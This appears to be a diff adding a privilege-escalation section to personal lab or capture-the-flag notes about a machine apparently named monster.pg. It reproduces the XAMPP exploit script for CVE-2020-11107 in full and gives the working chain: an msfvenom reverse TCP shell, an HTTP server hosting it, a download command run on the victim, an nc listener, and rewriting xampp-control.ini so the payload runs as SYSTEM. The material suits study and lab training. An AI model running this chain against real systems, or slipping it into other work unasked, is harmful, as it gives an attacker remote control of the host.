@@ -236,5 +236,72 @@ Got it.
 On to opening XAMPP.
 
 http://monster.pg/dashboard - Nope, 404.
-
 # Root access
+
+I should check `C:\xampp\properties.ini`.
+
+Then use `searchsploit` for Local Privilege Escalation.
+
+`base_stack_version=7.3.10-1`
+
+Okay.
+
+```sh
+
+searchsploit xampp
+# XAMPP 7.4.3 - Local Privilege Escalation | windows/local/50337.ps1
+
+searchsploit --path 50337
+
+ls /usr/share/exploitdb/exploits/windows/local/50337.ps1
+```
+
+50337.ps1:
+```powershell
+# Exploit Title: XAMPP 7.4.3 - Local Privilege Escalation
+# Exploit Author: Salman Asad (@deathflash1411) a.k.a LeoBreaker
+# Original Author: Maximilian Barz (@S1lkys)
+# Date: 27/09/2021
+# Vendor Homepage: https://www.apachefriends.org
+# Version: XAMPP < 7.2.29, 7.3.x < 7.3.16 & 7.4.x < 7.4.4
+# Tested on: Windows 10 + XAMPP 7.3.10
+# References: https://github.com/S1lkys/CVE-2020-11107
+
+$file = "C:\xampp\xampp-control.ini"
+$find = ((Get-Content $file)[2] -Split "=")[1]
+# Insert your payload path here
+$replace = "C:\temp\msf.exe"
+(Get-Content $file) -replace $find, $replace | Set-Content $file
+```
+
+```bash
+# get ip
+ip a | grep 192 # 192.168.49.51
+
+# generate payload
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.51 LPORT=80 -f exe -o shell.exe
+
+# serve
+python3 -m http.server 80
+
+# download on victim to C:\xampp\shell.exe
+iwr -uri http://192.168.49.51:80/shell.exe -Outfile C:\xampp\shell.exe
+
+# host rev shell listener, kill python
+nc -nvlp 80
+```
+
+![](Pasted%20image%2020260415143054.png)
+
+And to stage the payload on the victim:
+```powershell
+$file = "C:\xampp\xampp-control.ini"
+$find = ((Get-Content $file)[2] -Split "=")[1]
+# Insert your payload path here
+$replace = "C:\xampp\shell.exe"
+(Get-Content $file) -replace $find, $replace | Set-Content $file
+```
+
+![](Pasted%20image%2020260415143341.png)
+
+And we have SYSTEM access.
